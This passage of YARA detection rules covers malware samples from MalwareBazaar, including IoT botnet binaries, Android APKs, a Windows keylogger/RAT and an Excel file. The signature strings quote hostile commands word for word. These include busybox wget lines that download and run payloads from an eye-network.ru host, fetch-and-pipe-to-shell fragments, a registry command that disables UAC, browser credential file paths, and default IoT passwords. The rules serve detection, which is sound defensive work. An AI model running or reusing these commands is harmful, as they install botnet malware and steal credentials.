      $s6 = "xE3\\x00\\x40\\xA0\\xE1\\x70\\x80\\xBD\\x98\\x03\\x00\\x00\\xEB\"\"\\x00\\x30\\x64\\xE2\\x00\\x30\\x80\\xE5\\x00\\x00\\xE0\\xE3" ascii
      $s7 = "1\\x9F\\xE5\\x58\\x11\\x9F\\xE5\"\"\\x06\\x20\\xA0\\xE3\\x01\\x00\\xA0\\xE3\\x04\\x80\\x63\\xE0\\xD9\\xFF\\xFF\\xEB\\x02\\x40\\x" ascii
      $s8 = "x30\\xA0\\xE3\\x8E\\x10\\xA0\\xE3\"\"\\x35\\x20\\xA0\\xE3\\xB9\\x00\\xA0\\xE3\\x83\\xC0\\xCD\\xE5\\x80\\x40\\xCD\\xE5\\x81\\x60" ascii
      $s9 = "D\\xE8\\x01\\x10\\xA0\\xE3\"\"\\x0D\\x20\\xA0\\xE1\\x08\\x00\\x9F\\xE5\\x6C\\x00\\x00\\xEB\\x0C\\xD0\\x8D\\xE2\\x00\\x80\\xBD\\x" ascii
      $s10 = "xE5\\x04\\x20\\xA0\\xE3\\xB5\\xFF\\xFF\\xEB\"\"\\x00\\x00\\x64\\xE2\\x9A\\xFF\\xFF\\xEB\\x28\\x40\\x88\\xE2\\x05\\x00\\xA0\\xE1" ascii
      $s11 = "x81\\xE1\"\"\\xFF\\x30\\x03\\xE2\\x02\\x24\\xA0\\xE1\\x03\\x10\\x81\\xE1\\xFF\\x2C\\x02\\xE2\\x01\\x20\\x82\\xE1\\xFF\\x3C\\x02" ascii
      $s12 = "x10\\xA0\\xE1\\x07\\x00\\xA0\\xE1\\x01\\x00\\x00\\xDA\"\"\\x94\\xFF\\xFF\\xEB\\xF4\\xFF\\xFF\\xEA\\x05\\x00\\xA0\\xE1\\x7C\\xFF" ascii
      $s13 = "B\\x05\\x00\\xA0\\xE1\\x80\\x10\\x8D\\xE2\"\"\\x10\\x20\\xA0\\xE3\\xB1\\xFF\\xFF\\xEB\\x00\\x40\\x50\\xE2\\x05\\x00\\x00\\xAA\\x" ascii
      $s14 = "5\\xFF\\xFF\\xEB\\x1C\\x11\\x9F\\xE5\"\"\\x84\\x00\\x8D\\xE5\\x18\\x21\\x9F\\xE5\\x18\\x01\\x9F\\xE5\\xB8\\xFF\\xFF\\xEB\\x01\\x" ascii
      $s15 = "x03\\x10\\xA0\\xE3\"\"\\x0D\\x20\\xA0\\xE1\\x08\\x00\\x9F\\xE5\\x84\\x00\\x00\\xEB\\x0C\\xD0\\x8D\\xE2\\x00\\x80\\xBD\\xE8\\x66" ascii
      $s16 = "4\\xA0\\xE1\"\"\\x20\\x04\\xA0\\xE1\\x22\\x0C\\x80\\xE1\\x02\\x3C\\x83\\xE1\\x00\\x00\\x83\\xE1\\x0E\\xF0\\xA0\\xE1\\x00\\x10\\x" ascii
      $s17 = "\"\\x7F\\x45\\x4C\\x46\\x01\\x01\\x01\\x61\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x28\\x00\\x01\\x00\\x00\\x00\\x1C" ascii
      $s18 = "A\\xFF\\xFF\\xEB\\x38\\x10\\x9F\\xE5\\x04\\x20\\xA0\\xE3\"\"\\x01\\x00\\xA0\\xE3\\x8B\\xFF\\xFF\\xEB\\x05\\x00\\xA0\\xE3\\x70\\x" ascii
      $s19 = "1\\x00\\x10\\xA0\\xE1\"\"\\x08\\x00\\x9F\\xE5\\x02\\x30\\xA0\\xE1\\x0C\\x20\\xA0\\xE1\\x7B\\x00\\x00\\xEA\\x04\\x00\\x90\\x00\\x" ascii
      $s20 = "xA0\\xE1\\xAD\\xFF\\xFF\\xEB\\x01\\x00\\x50\\xE3\"\"\\x04\\x00\\xA0\\xE3\\x8A\\xFF\\xFF\\x1B\\x93\\x30\\xDD\\xE5\\x04\\x44\\x83" ascii
   condition:
      uint16(0) == 0x5c22 and filesize < 10KB and
      8 of them
}

rule sig_12df52f5ce75d8cfef48e06266edda35c0bc7ff695aca52052a520c527455cb1 {
   meta:
      description = "evidences - file 12df52f5ce75d8cfef48e06266edda35c0bc7ff695aca52052a520c527455cb1.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-15"
      hash1 = "12df52f5ce75d8cfef48e06266edda35c0bc7ff695aca52052a520c527455cb1"
   strings:
      $s1 = "busybox wget http://dihvbe.eye-network.ru/gnjqwpc; chmod 777 gnjqwpc; ./gnjqwpc telnet" fullword ascii
      $s2 = "busybox wget http://dihvbe.eye-network.ru/fbhervbhsl; chmod 777 fbhervbhsl; ./fbhervbhsl telnet" fullword ascii
      $s3 = "busybox wget http://dihvbe.eye-network.ru/vevhea4; chmod 777 vevhea4; ./vevhea4 telnet" fullword ascii
      $s4 = "busybox wget http://dihvbe.eye-network.ru/debvps; chmod 777 debvps; ./debvps telnet" fullword ascii
      $s5 = "busybox wget http://dihvbe.eye-network.ru/wev86; chmod 777 wev86; ./wev86 telnet" fullword ascii
      $s6 = "busybox wget http://dihvbe.eye-network.ru/woega6; chmod 777 woega6; ./woega6 telnet" fullword ascii
      $s7 = "busybox wget http://dihvbe.eye-network.ru/wrjkngh4; chmod 777 wrjkngh4; ./wrjkngh4 telnet" fullword ascii
      $s8 = "busybox wget http://dihvbe.eye-network.ru/ngwa5; chmod 777 ngwa5; ./ngwa5 telnet" fullword ascii
      $s9 = "busybox wget http://dihvbe.eye-network.ru/wlw68k; chmod 777 wlw68k; ./wlw68k telnet" fullword ascii
      $s10 = "busybox wget http://dihvbe.eye-network.ru/qbfwdbg; chmod 777 qbfwdbg; ./qbfwdbg telnet" fullword ascii
      $s11 = "busybox wget http://dihvbe.eye-network.ru/jefne64; chmod 777 jefne64; ./jefne64 telnet" fullword ascii
      $s12 = "busybox wget http://dihvbe.eye-network.ru/ivwebcda7; chmod 777 ivwebcda7; ./ivwebcda7 telnet" fullword ascii
      $s13 = "busybox wget http://dihvbe.eye-network.ru/fqkjei686; chmod 777 fqkjei686; ./fqkjei686 telnet" fullword ascii
   condition:
      uint16(0) == 0x7562 and filesize < 3KB and
      8 of them
}

rule sig_1605a3a23aa1879b16eb01ab187603d36b8fa3d98163c3e928043e01fde2ea8a {
   meta:
      description = "evidences - file 1605a3a23aa1879b16eb01ab187603d36b8fa3d98163c3e928043e01fde2ea8a.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-15"
      hash1 = "1605a3a23aa1879b16eb01ab187603d36b8fa3d98163c3e928043e01fde2ea8a"
   strings:
      $s1 = "0\"\"\\xEC\\x03\\x00\\x00\\x16\\x00\\x00\\x00\\x34\\x00\\x20\\x00\\x03\\x00\\x28\\x00\\x05\\x00\\x04\\x00\\x01\\x00\\x00\\x00\\x" ascii
      $s2 = "E\\x2B\\x41\\x09\\x00\"\"\\x30\\x03\\x40\\x00\\xE6\\x2F\\x22\\x4F\\x07\\xD0\\xF4\\x7F\\xF3\\x6E\\x42\\x2E\\x51\\x1E\\x66\\xE4\\x" ascii
      $s3 = "xF6\\x6E\\x2B\\x41\\x09\\x00\"\"\\x30\\x03\\x40\\x00\\xE6\\x2F\\x22\\x4F\\x07\\xD0\\xF4\\x7F\\xF3\\x6E\\x42\\x2E\\x51\\x1E\\x66" ascii
      $s4 = "0\\xE3\\x66\\x0C\\x7E\\xE3\\x6F\"\"\\x26\\x4F\\xF6\\x6E\\x0B\\x00\\x09\\x00\\x30\\x03\\x40\\x00\\x86\\x2F\\x96\\x2F\\xA6\\x2F\\x" ascii
      $s5 = "xD2\\xB4\\x7F\\xB8\\x7F\\xF3\\x6E\"\"\\x20\\x61\\x18\\x21\\xFC\\x8F\\x01\\x72\\xFF\\x72\\x46\\xD0\\x23\\x6A\\x44\\xD1\\x01\\xE4" ascii
      $s6 = "E\\x00\\xB9\\x00\\x8E\\x00\\x41\\x02\\xFF\\x01\\x93\\x00\"\"\\x80\\x03\\x40\\x00\\x4C\\x01\\x40\\x00\\x84\\x03\\x40\\x00\\x94\\x" ascii
      $s7 = "0\\x00\\x00\\x03\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xCC\\x03\\x00\\x00\"\"\\x1E\\x00\\x00\\x00\\x00\\x00\\x" ascii
      $s8 = "0\\x00\\x00\\x00\\x00\\x0B\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x06\\x00\\x00\\x00\"\"\\x94\\x00\\x40\\x00\\x94\\x00\\x00\\x00\\x" ascii
      $s9 = "x8C\\x03\\x40\\x00\\x84\\x01\\x40\\x00\\xD8\\x00\\x40\\x00\"\"\\x24\\x01\\x40\\x00\\x90\\x03\\x40\\x00\\x98\\x03\\x40\\x00\\x68" ascii
      $s10 = "B\\x40\\x18\\x3A\\x78\\x92\\x02\\xE1\"\"\\x77\\x90\\xEC\\x38\\x76\\x97\\x35\\xE6\\x25\\x0E\\x40\\xD0\\x73\\x94\\x73\\x95\\x0B\\x" ascii
      $s11 = "x67\\x65\\x6E\\x74\\x3A\\x20\\x57\\x67\\x65\\x74\\x2F\\x31\\x2E\\x31\\x0D\"\"\\x0A\\x0D\\x0A\\x00\\x46\\x49\\x4E\\x0A\\x00\\x00" ascii
      $s12 = "x42\\x28\\x43\"\"\\x19\\x46\\x19\\x42\\x3B\\x20\\x6B\\x22\\x2B\\x20\\xE3\\x6F\\xF6\\x6E\\x0B\\x00\\x09\\x00\\x09\\x00\\x00\\x00" ascii
      $s13 = "\"\\x7F\\x45\\x4C\\x46\\x01\\x01\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x2A\\x00\\x01\\x00\\x00\\x00\\x1C" ascii
      $s14 = "B\\x40\\x09\\x00\\x8B\\x61\\x12\\x20\\xFF\\xE0\\xE3\\x6F\\x26\\x4F\"\"\\xF6\\x6E\\xF6\\x68\\x0B\\x00\\x09\\x00\\x6C\\x03\\x40\\x" ascii
      $s15 = "F\\xB3\\x64\\x0B\\x4A\\x09\\x00\\xF1\\xAF\\x09\\x00\"\"\\x1C\\xD8\\x0B\\x48\\x93\\x64\\x0B\\x48\\xB3\\x64\\x1B\\xD5\\x04\\xE6\\x" ascii
      $s16 = "0\\x00\\x4C\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\"\"\\x01\\x00\\x00\\x00\\x19\\x00\\x00\\x" ascii
      $s17 = "xF6\\x6E\\x2B\\x41\"\"\\x09\\x00\\x09\\x00\\x30\\x03\\x40\\x00\\x53\\x61\\x63\\x67\\x13\\x66\\x04\\xD1\\xE6\\x2F\\x43\\x65\\xF3" ascii
      $s18 = "x63\\xE6\\x2F\\x53\\x64\\x22\\x4F\\x63\\x65\\xF3\\x6E\\x73\\x66\"\"\\xE4\\x50\\xE3\\x57\\xE5\\x51\\x16\\xC3\\x82\\xE1\\x16\\x30" ascii
      $s19 = "4\\xF3\\x6E\"\"\\x4B\\x25\\x6C\\x66\\x7C\\x67\\x5B\\x27\\x18\\x46\\x7B\\x26\\x63\\x60\\x1D\\x40\\x08\\xD1\\x63\\x63\\x19\\x43\\x" ascii
      $s20 = "x3E\\xD4\\x6E\\x95\\x6E\\x96\\x0B\\x40\"\"\\x09\\x00\\x03\\x6B\\x3C\\xD0\\x02\\xE4\\x01\\xE5\\x0B\\x40\\x00\\xE6\\xFF\\x88\\x03" ascii
   condition:
      uint16(0) == 0x5c22 and filesize < 10KB and
      8 of them
}

rule sig_1905e614711f526fa219f22a9e2ed63520344b1be567c58846db386066111c75 {
   meta:
      description = "evidences - file 1905e614711f526fa219f22a9e2ed63520344b1be567c58846db386066111c75.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-15"
      hash1 = "1905e614711f526fa219f22a9e2ed63520344b1be567c58846db386066111c75"
   strings:
      $s1 = "jYrulu4" fullword ascii
      $s2 = "TGMy|_k" fullword ascii
      $s3 = "\"UBlA.y:w" fullword ascii
      $s4 = "mNvYF2" fullword ascii
      $s5 = "\\*>2k`" fullword ascii
      $s6 = "r:{& rx" fullword ascii
      $s7 = "06b:TO" fullword ascii
      $s8 = "49m@}T" fullword ascii
      $s9 = "l'jKh%" fullword ascii
      $s10 = "8c`uPG" fullword ascii
      $s11 = "aiy*=[" fullword ascii
      $s12 = "yH,)>:" fullword ascii
      $s13 = "~IYWN~" fullword ascii
      $s14 = "*uV`ueC1W" fullword ascii
      $s15 = "(S2nsP" fullword ascii
      $s16 = "_34F1-" fullword ascii
      $s17 = "47yqKl" fullword ascii
      $s18 = "uN+W#v" fullword ascii
      $s19 = "CyPN+A" fullword ascii
      $s20 = "8x|c}\\" fullword ascii
   condition:
      uint16(0) == 0xe1f5 and filesize < 300KB and
      8 of them
}

rule sig_28df34c57eb7aea7a0dce2e4974ac368f74ea54518480dbe77b927ca45ff4f8c {
   meta:
      description = "evidences - file 28df34c57eb7aea7a0dce2e4974ac368f74ea54518480dbe77b927ca45ff4f8c.img"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-15"
      hash1 = "28df34c57eb7aea7a0dce2e4974ac368f74ea54518480dbe77b927ca45ff4f8c"
   strings:
      $s1 = "get_TemplateLoader" fullword ascii
      $s2 = "get_TemplateLoaderLexerOptions" fullword ascii
      $s3 = "get_TemplateLoaderParserOptions" fullword ascii
      $s4 = "Qixdlfjbt.exe" fullword wide
      $s5 = "set_TemplateLoaderLexerOptions" fullword ascii
      $s6 = "set_TemplateLoaderParserOptions" fullword ascii
      $s7 = "set_TemplateLoader" fullword ascii
      $s8 = "ITemplateLoader" fullword ascii
      $s9 = "System.Collections.Generic.IEnumerable<Scriban.Parsing.Token>.GetEnumerator" fullword ascii
      $s10 = "processPipeArguments" fullword ascii
      $s11 = "System.Collections.Generic.IEnumerable<Scriban.Runtime.IScriptObject>.GetEnumerator" fullword ascii
      $s12 = "ScriptBinaryOperator" fullword ascii
      $s13 = "ScriptBinaryOperatorExtensions" fullword ascii
      $s14 = "System.Collections.Generic.IEnumerator<Scriban.Runtime.IScriptObject>.get_Current" fullword ascii
      $s15 = "ProcessOption" fullword ascii
      $s16 = "        <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/>" fullword ascii
      $s17 = "ScriptUnaryOperatorExtensions" fullword ascii
      $s18 = "ScriptUnaryOperator" fullword ascii
      $s19 = "QIXDLFJBT.EXE;1" fullword ascii
      $s20 = "assign expression(<target_expression> = <value_expression>" fullword ascii
   condition:
      uint16(0) == 0x0000 and filesize < 5000KB and
      8 of them
}

rule sig_4a520bf34e7734933ac14eb4dbf06163b9821e7e48ce55a0f6ce9443109dd39b {
   meta:
      description = "evidences - file 4a520bf34e7734933ac14eb4dbf06163b9821e7e48ce55a0f6ce9443109dd39b.apk"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-15"
      hash1 = "4a520bf34e7734933ac14eb4dbf06163b9821e7e48ce55a0f6ce9443109dd39b"
   strings:
      $s1 = "\" id=\"W5M0MpCehiHzreSzNTczkc9d\"?> <x:xmpmeta xmlns:x=\"adobe:ns:meta/\" x:xmptk=\"Adobe XMP Core 5.3-c011 66.145661, 2012/02/" ascii
      $s2 = "\" id=\"W5M0MpCehiHzreSzNTczkc9d\"?> <x:xmpmeta xmlns:x=\"adobe:ns:meta/\" x:xmptk=\"Adobe XMP Core 5.3-c011 66.145661, 2012/02/" ascii
      $s3 = "22Base.Widget.AppCompat.Button.ButtonBar.AlertDialog" fullword ascii
      $s4 = "00Base.Widget.AppCompat.CompoundButton.RadioButton" fullword ascii
      $s5 = "Fazer login com o Google" fullword ascii
      $s6 = "wppppppp" fullword ascii /* reversed goodware string 'pppppppw' */
      $s7 = "11RtlOverlay.Widget.AppCompat.Search.DropDown.Icon1" fullword ascii
      $s8 = "&&Widget.AppCompat.ButtonBar.AlertDialog" fullword ascii
      $s9 = "11Widget.AppCompat.Light.Spinner.DropDown.ActionBar" fullword ascii
      $s10 = "++Base.Widget.AppCompat.ButtonBar.AlertDialog" fullword ascii
      $s11 = "11RtlOverlay.Widget.AppCompat.Search.DropDown.Icon2" fullword ascii
      $s12 = "11Base.TextAppearance.AppCompat.Widget.DropDownItem" fullword ascii
      $s13 = "11RtlOverlay.Widget.AppCompat.Search.DropDown.Query" fullword ascii
      $s14 = "00RtlOverlay.Widget.AppCompat.Search.DropDown.Text" fullword ascii
      $s15 = ",,RtlOverlay.Widget.AppCompat.DialogTitle.Icon" fullword ascii
      $s16 = "--Widget.AppCompat.Button.ButtonBar.AlertDialog" fullword ascii
      $s17 = " :http://ns.adobe.com/xap/1.0/" fullword ascii
      $s18 = "obe.com/xap/1.0/sType/ResourceRef#\" xmp:CreatorTool=\"Adobe Photoshop CS6 (Windows)\" xmp:CreateDate=\"2014-03-22T17:32+02:00\"" ascii
      $s19 = "xmpMM=\"http://ns.adobe.com/xap/1.0/mm/\" xmlns:stEvt=\"http://ns.adobe.com/xap/1.0/sType/ResourceEvent#\" xmlns:stRef=\"http://" ascii
      $s20 = "//ns.adobe.com/xap/1.0/\" xmlns:dc=\"http://purl.org/dc/elements/1.1/\" xmlns:photoshop=\"http://ns.adobe.com/photoshop/1.0/\" x" ascii
   condition:
      uint16(0) == 0x4b50 and filesize < 17000KB and
      8 of them
}

rule sig_40fa63e6cca94a31978559b76c87f41aaf4df55b239dc0b23b0db98b1ba7e52d {
   meta:
      description = "evidences - file 40fa63e6cca94a31978559b76c87f41aaf4df55b239dc0b23b0db98b1ba7e52d.apk"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-15"
      hash1 = "40fa63e6cca94a31978559b76c87f41aaf4df55b239dc0b23b0db98b1ba7e52d"
   strings:
      $s1 = "##password_toggle_content_description" fullword ascii
      $s2 = "  passwordToggleContentDescription" fullword ascii
      $s3 = "res/drawable-v21/design_password_eye.xml" fullword ascii
      $s4 = "((res/drawable-v21/design_password_eye.xml" fullword ascii
      $s5 = "22Base.Widget.AppCompat.Button.ButtonBar.AlertDialog" fullword ascii
      $s6 = "META-INF/services/com.google.protobuf.GeneratedExtensionRegistryLoaderPK" fullword ascii
      $s7 = "00Base.Widget.AppCompat.CompoundButton.RadioButton" fullword ascii
      $s8 = "META-INF/services/com.google.protobuf.GeneratedExtensionRegistryLoader%" fullword ascii
      $s9 = "Fazer login com o Google" fullword ascii
      $s10 = "design_password_eye" fullword ascii
      $s11 = "11RtlOverlay.Widget.AppCompat.Search.DropDown.Icon1" fullword ascii
      $s12 = "&&Widget.AppCompat.ButtonBar.AlertDialog" fullword ascii
      $s13 = "11Widget.AppCompat.Light.Spinner.DropDown.ActionBar" fullword ascii
      $s14 = "++Base.Widget.AppCompat.ButtonBar.AlertDialog" fullword ascii
      $s15 = "path_password_eye" fullword ascii
      $s16 = "res/drawable-v21/design_password_eye.xmlPK" fullword ascii
      $s17 = "%%path_password_eye_mask_strike_through" fullword ascii
      $s18 = "11RtlOverlay.Widget.AppCompat.Search.DropDown.Icon2" fullword ascii
      $s19 = "11Base.TextAppearance.AppCompat.Widget.DropDownItem" fullword ascii
      $s20 = "11RtlOverlay.Widget.AppCompat.Search.DropDown.Query" fullword ascii
   condition:
      uint16(0) == 0x4b50 and filesize < 9000KB and
      8 of them
}

rule sig_2ecfdb89f16c1535e6cc6a83275bd9fbd1e0d8e86db04c04f826146b49d3f691 {
   meta:
      description = "evidences - file 2ecfdb89f16c1535e6cc6a83275bd9fbd1e0d8e86db04c04f826146b49d3f691.exe"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-15"
      hash1 = "2ecfdb89f16c1535e6cc6a83275bd9fbd1e0d8e86db04c04f826146b49d3f691"
   strings:
      $x1 = "C:\\Windows\\System32\\cmd.exe" fullword ascii
      $x2 = "/k %windir%\\System32\\reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWOR" ascii
      $x3 = "/k %windir%\\System32\\reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWOR" ascii
      $s4 = "api-ms-win-core-synch-l1-2-0.dll" fullword wide /* reversed goodware string 'lld.0-2-1l-hcnys-eroc-niw-sm-ipa' */
      $s5 = "CreateObject(\"WScript.Shell\").Run \"cmd /c \"\"" fullword wide
      $s6 = "[+] ShellExec success" fullword ascii
      $s7 = "[+] before ShellExec" fullword ascii
      $s8 = "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\" fullword ascii
      $s9 = "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data" fullword ascii
      $s10 = "[+] ucmCMLuaUtilShellExecMethod" fullword ascii
      $s11 = "rmclient.exe" fullword wide
      $s12 = "Keylogger initialization failure: error " fullword ascii
      $s13 = "[-] CoGetObject FAILURE" fullword ascii
      $s14 = "Offline Keylogger Stopped" fullword ascii
      $s15 = "Online Keylogger Started" fullword ascii
      $s16 = "Online Keylogger Stopped" fullword ascii
      $s17 = "Offline Keylogger Started" fullword ascii
      $s18 = "fso.DeleteFile(Wscript.ScriptFullName)" fullword wide
      $s19 = "Executing file: " fullword ascii
      $s20 = "\\logins.json" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and 4 of them
}

rule sig_39cde17eb1eacd24c8ec0ddbf996ccdc02af9a1deb3e121f053a15053721e3f9 {
   meta:
      description = "evidences - file 39cde17eb1eacd24c8ec0ddbf996ccdc02af9a1deb3e121f053a15053721e3f9.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-15"
      hash1 = "39cde17eb1eacd24c8ec0ddbf996ccdc02af9a1deb3e121f053a15053721e3f9"
   strings:
      $s1 = "/wget.sh -O- | sh;/bin/busybox tftp -g " fullword ascii
      $s2 = " -r tftp.sh -l- | sh;/bin/busybox ftpget " fullword ascii
      $s3 = "tluafed" fullword ascii /* reversed goodware string 'default' */
      $s4 = "User-Agent: Wget" fullword ascii
      $s5 = "/bin/busybox wget http://" fullword ascii
      $s6 = "/proc/%s/cmdline" fullword ascii
      $s7 = " ftpget.sh ftpget.sh && sh ftpget.sh;curl http://" fullword ascii
      $s8 = "xirtam" fullword ascii /* reversed goodware string 'matrix' */
      $s9 = "linuxshell" fullword ascii
      $s10 = "/curl.sh -o- | sh" fullword ascii
      $s11 = "/bin/busybox hostname FICORA" fullword ascii
      $s12 = "admintelecom" fullword ascii
      $s13 = " /proc/%s/status" fullword ascii
      $s14 = "/bin/busybox echo -ne " fullword ascii
      $s15 = "solokey" fullword ascii
      $s16 = "telecomadmin" fullword ascii
      $s17 = "supportadmin" fullword ascii
      $s18 = "GET /dlr." fullword ascii
      $s19 = "Remote I/O error" fullword ascii
      $s20 = "usage: busybox" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      8 of them
}

rule sig_6e9b0e8423f09c4d85e1e358a6a6f66f78f8e20f354a36de4c5e9904459e9ae0 {
   meta:
      description = "evidences - file 6e9b0e8423f09c4d85e1e358a6a6f66f78f8e20f354a36de4c5e9904459e9ae0.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-15"
      hash1 = "6e9b0e8423f09c4d85e1e358a6a6f66f78f8e20f354a36de4c5e9904459e9ae0"
   strings:
      $s1 = "/wget.sh -O- | sh;/bin/busybox tftp -g " fullword ascii
      $s2 = " -r tftp.sh -l- | sh;/bin/busybox ftpget " fullword ascii
      $s3 = "tluafed" fullword ascii /* reversed goodware string 'default' */
      $s4 = "User-Agent: Wget" fullword ascii
      $s5 = "/bin/busybox wget http://" fullword ascii
      $s6 = "/proc/%s/cmdline" fullword ascii
      $s7 = " ftpget.sh ftpget.sh && sh ftpget.sh;curl http://" fullword ascii
      $s8 = "xirtam" fullword ascii /* reversed goodware string 'matrix' */
      $s9 = "linuxshell" fullword ascii
      $s10 = "/curl.sh -o- | sh" fullword ascii
      $s11 = "/bin/busybox hostname FICORA" fullword ascii
      $s12 = "admintelecom" fullword ascii
      $s13 = "/bin/busybox echo -ne " fullword ascii
      $s14 = "solokey" fullword ascii
      $s15 = "telecomadmin" fullword ascii
      $s16 = "supportadmin" fullword ascii
      $s17 = "GET /dlr." fullword ascii
      $s18 = "Remote I/O error" fullword ascii
      $s19 = "usage: busybox" fullword ascii
      $s20 = "wabjtam" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      8 of them
}

rule dcf6a3230b7c59438178c49328e2800be52f8bbeddc814dde6415d0f5a15176e {
   meta:
      description = "evidences - file dcf6a3230b7c59438178c49328e2800be52f8bbeddc814dde6415d0f5a15176e.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-15"
      hash1 = "dcf6a3230b7c59438178c49328e2800be52f8bbeddc814dde6415d0f5a15176e"
   strings:
      $s1 = "(unknown authentication error - %d)" fullword ascii
      $s2 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows" fullword ascii
      $s3 = "/proc/%d/cmdline" fullword ascii
      $s4 = "__get_myaddress: ioctl (get interface configuration)" fullword ascii
      $s5 = "ofewu.eye-network.ru" fullword ascii
      $s6 = "HOST: 255.255.255.255:1900" fullword ascii
      $s7 = "RPC: Remote system error" fullword ascii
      $s8 = "/etc/config/hosts" fullword ascii
      $s9 = "__get_myaddress: socket" fullword ascii
      $s10 = "service:service-agent" fullword ascii
      $s11 = "__get_myaddress: ioctl" fullword ascii
      $s12 = "Remote I/O error" fullword ascii
      $s13 = "bad auth_len gid %d str %d auth %d" fullword ascii
      $s14 = "RPC: Port mapper failure" fullword ascii
      $s15 = "RPC: Incompatible versions of RPC" fullword ascii
      $s16 = "RPC: Unknown host" fullword ascii
      $s17 = "#$%&'()*+,234567" fullword ascii /* hex encoded string '#Eg' */
      $s18 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr" fullword ascii
      $s19 = "RPC: Program/version mismatch" fullword ascii
      $s20 = "RPC: (unknown error code)" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 500KB and
      8 of them
}

rule sig_58b3727f1e6f9643e517deb67a5b8667490d2d41253119f848368a069a8f978b {
   meta:
      description = "evidences - file 58b3727f1e6f9643e517deb67a5b8667490d2d41253119f848368a069a8f978b.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-15"
      hash1 = "58b3727f1e6f9643e517deb67a5b8667490d2d41253119f848368a069a8f978b"
   strings:
      $s1 = "get_kernel_syms" fullword ascii
      $s2 = "Idle Time expired, Timing Out !!!" fullword ascii
      $s3 = "klogctl" fullword ascii
      $s4 = "getspnam" fullword ascii
      $s5 = "getspent" fullword ascii
      $s6 = "pmap_getport" fullword ascii
      $s7 = "fgets_unlocked" fullword ascii
      $s8 = "getspnam_r" fullword ascii
      $s9 = "fgetpwent_r" fullword ascii
      $s10 = "pmap_getmaps" fullword ascii
      $s11 = "fgetgrent_r" fullword ascii
      $s12 = "getspent_r" fullword ascii
      $s13 = "endspent" fullword ascii
      $s14 = "swapoff" fullword ascii
      $s15 = "putpwent" fullword ascii
      $s16 = "setspent" fullword ascii
      $s17 = "sigsetmask" fullword ascii
      $s18 = "clnt_perror" fullword ascii
      $s19 = "clnt_pcreateerror" fullword ascii
      $s20 = "pivot_root" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 80KB and
      8 of them
}

rule sig_943c3e351efdfd7b6d3fe502a2ef776fc8bbcbe458d1a3c9393a2dae32dd441c {
   meta:
      description = "evidences - file 943c3e351efdfd7b6d3fe502a2ef776fc8bbcbe458d1a3c9393a2dae32dd441c.xlsx"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-15"
      hash1 = "943c3e351efdfd7b6d3fe502a2ef776fc8bbcbe458d1a3c9393a2dae32dd441c"
   strings:
      $s1 = "<rdf:Description rdf:about=\"\" xmlns:dc=\"http://purl.org/dc/elements/1.1/\" xmlns:xap=\"http://ns.adobe.com/xap/1.0/\" xmlns:x" ascii
      $s2 = "<rdf:Description rdf:about=\"\" xmlns:dc=\"http://purl.org/dc/elements/1.1/\" xmlns:xap=\"http://ns.adobe.com/xap/1.0/\" xmlns:x" ascii
      $s3 = "om/photoshop/1.0/\" xmlns:tiff=\"http://ns.adobe.com/tiff/1.0/\" xmlns:exif=\"http://ns.adobe.com/exif/1.0/\" dc:format=\"image/" ascii
      $s4 = "http://ns.adobe.com/xap/1.0/mm/\" xmlns:stRef=\"http://ns.adobe.com/xap/1.0/sType/ResourceRef#\" xmlns:photoshop=\"http://ns.ado" ascii
      $s5 = "<key>com.apple.print.ticket.APIVersion</key>" fullword ascii
      $s6 = "xl/media/image2.tmp" fullword ascii
      $s7 = "<key>com.apple.print.subTicket.paper_info_ticket</key>" fullword ascii
      $s8 = "<key>com.apple.print.ticket.type</key>" fullword ascii
      $s9 = "<key>com.apple.print.ticket.itemArray</key>" fullword ascii
      $s10 = "<key>com.apple.print.PaperInfo.ppd.PMPaperName</key>" fullword ascii
      $s11 = "<key>com.apple.print.ticket.creator</key>" fullword ascii
      $s12 = "<key>com.apple.print.ticket.stateFlag</key>" fullword ascii
      $s13 = "xl/media/image2.tmpPK" fullword ascii
      $s14 = "xl/printerSettings/printerSettings6.bin" fullword ascii
      $s15 = "xl/printerSettings/printerSettings10.bin" fullword ascii
